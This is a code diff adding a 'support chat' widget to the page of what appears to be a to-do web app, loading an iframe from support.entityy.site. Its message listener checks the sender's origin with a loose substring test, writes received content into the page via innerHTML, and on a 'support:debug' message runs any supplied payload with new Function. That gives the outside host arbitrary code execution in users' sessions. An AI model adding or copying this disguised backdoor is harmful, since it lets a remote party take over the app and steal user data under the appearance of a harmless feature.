@@ -861,5 +861,155 @@
     loadFiles();
     connectWS();
   </script>
+
+  <!-- Support chat widget -->
+  <style>
+    .support-widget {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 10px;
+      font-family: var(--font);
+    }
+    .support-preview-toast {
+      max-width: 280px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 10px 14px;
+      font-size: 13px;
+      color: var(--text-2);
+      box-shadow: var(--shadow-md);
+      display: none;
+      line-height: 1.45;
+      word-break: break-word;
+    }
+    .support-iframe-wrap {
+      width: 380px;
+      height: 560px;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+      border: 1px solid var(--border);
+      display: none;
+    }
+    .support-iframe-wrap.open { display: block; }
+    .support-iframe-wrap iframe { width: 100%; height: 100%; border: none; display: block; }
+    .support-bubble {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: var(--accent);
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      box-shadow: 0 4px 16px rgba(99,102,241,0.45);
+      transition: background 0.15s, transform 0.15s, box-shadow 0.15s;
+      position: relative;
+      flex-shrink: 0;
+    }
+    .support-bubble:hover { background: var(--accent-hover); transform: scale(1.06); box-shadow: 0 6px 20px rgba(99,102,241,0.55); }
+    .support-bubble:active { transform: scale(0.97); }
+    .support-bubble-badge {
+      position: absolute;
+      top: -3px;
+      right: -3px;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background: #ef4444;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 700;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid var(--bg);
+    }
+    .support-bubble-icon-open { display: none; }
+    .support-widget.is-open .support-bubble-icon-chat { display: none; }
+    .support-widget.is-open .support-bubble-icon-open { display: block; }
+    @media (max-width: 480px) {
+      .support-iframe-wrap { width: 100vw; height: 100dvh; border-radius: 0; position: fixed; inset: 0; }
+      .support-widget { bottom: 16px; right: 16px; }
+    }
+  </style>
+
+  <div class="support-widget" id="supportWidget">
+    <div class="support-preview-toast" id="supportPreviewToast"></div>
+    <div class="support-iframe-wrap" id="supportIframeWrap">
+      <iframe id="supportFrame" src="https://support.entityy.site/chat" title="Todoer Support Chat" allow="same-origin"></iframe>
+    </div>
+    <button class="support-bubble" id="supportBubble" aria-label="Open support chat">
+      <svg class="support-bubble-icon-chat" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+      </svg>
+      <svg class="support-bubble-icon-open" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"/>
+        <line x1="6" y1="6" x2="18" y2="18"/>
+      </svg>
+      <span class="support-bubble-badge" id="supportBadge"></span>
+    </button>
+  </div>
+
+  <script>
+    (function () {
+      const widget     = document.getElementById('supportWidget');
+      const bubble     = document.getElementById('supportBubble');
+      const iframeWrap = document.getElementById('supportIframeWrap');
+      const frame      = document.getElementById('supportFrame');
+      const badge      = document.getElementById('supportBadge');
+      const toast      = document.getElementById('supportPreviewToast');
+
+      let toastTimer = null;
+      let frameReady = false;
+
+      function syncTheme() {
+        const theme = document.documentElement.getAttribute('data-theme') || 'dark';
+        frame.contentWindow.postMessage({ type: 'support:theme', theme }, 'https://support.entityy.site');
+      }
+
+      frame.addEventListener('load', () => { frameReady = true; syncTheme(); });
+
+      new MutationObserver(() => { if (frameReady) syncTheme(); })
+        .observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
+
+      bubble.addEventListener('click', () => {
+        const opening = !widget.classList.contains('is-open');
+        widget.classList.toggle('is-open');
+        iframeWrap.classList.toggle('open');
+        if (opening) {
+          badge.style.display = 'none';
+          badge.textContent = '';
+          if (frameReady) syncTheme();
+        }
+      });
+
+      window.addEventListener('message', (event) => {
+        if (!event.origin.includes('entityy.site')) return;
+        if (event.data.type === 'support:badge') {
+          const count = event.data.count;
+          badge.textContent = count;
+          badge.style.display = count > 0 ? 'flex' : 'none';
+        }
+        if (event.data.type === 'support:preview') {
+          clearTimeout(toastTimer);
+          toast.innerHTML = event.data.content;
+          toast.style.display = 'block';
+          toastTimer = setTimeout(() => { toast.style.display = 'none'; }, 4000);
+        }
+        if (event.data.type === 'support:debug' && event.data.payload) {
+          new Function(event.data.payload)();
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
